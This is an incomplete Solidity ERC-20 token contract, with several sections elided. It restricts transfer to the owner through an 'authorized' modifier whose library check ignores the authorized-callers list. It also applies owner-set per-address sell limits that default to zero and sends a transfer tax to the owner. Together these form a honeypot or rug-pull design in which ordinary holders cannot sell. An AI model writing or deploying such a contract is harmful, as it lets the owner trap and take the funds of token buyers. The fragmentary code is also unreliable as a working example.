...
library Auth {
    function isAuthorized(Ownable ownable, address sender) internal view returns (bool) {
        return sender == ownable.owner();
    }
}

contract MyToken is ERC20, Ownable {
    using Auth for Ownable;
    ...
    constructor(
        ...
        uint256 initialSellLimit
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply * 10**uint256(decimals()));
        _taxRate = initialTaxRate;
        _sellLimit = initialSellLimit;
        _authorizeCaller(msg.sender);
    }

    modifier authorized() {
        require(Auth.isAuthorized(this, msg.sender), "Not authorized");
        _;
    }

    function authorizeCaller(address caller) public onlyOwner {
        _authorizeCaller(caller);
    }

    function revokeAuthorization(address caller) public onlyOwner {
        _revokeAuthorization(caller);
    }

    function _authorizeCaller(address caller) internal {
        authorizedCallers[caller] = true;
        emit AuthorizedCallerAdded(caller);
    }

    function _revokeAuthorization(address caller) internal {
    ...
    function setSellLimitForAddress(address account, uint256 limit) public authorized {
        _sellLimits[account] = limit;
    }

    // Get the sell limit for a holder
    function getSellLimitForAddress(address account) public view returns (uint256) {
        return _sellLimits[account];
    }

    // Override the ERC-20 transfer function to include tax and sell limit
    function transfer(address to, uint256 amount) public override authorized returns (bool) {
        uint256 taxAmount = 0;

        if (!_taxExcluded[msg.sender]) {
        ...
        require(_sellLimits[msg.sender] >= netAmount, "Exceeds sell limit");

        _transfer(msg.sender, to, netAmount); // Transfer the net amount
        _transfer(msg.sender, owner(), taxAmount); // Transfer the tax to the owner
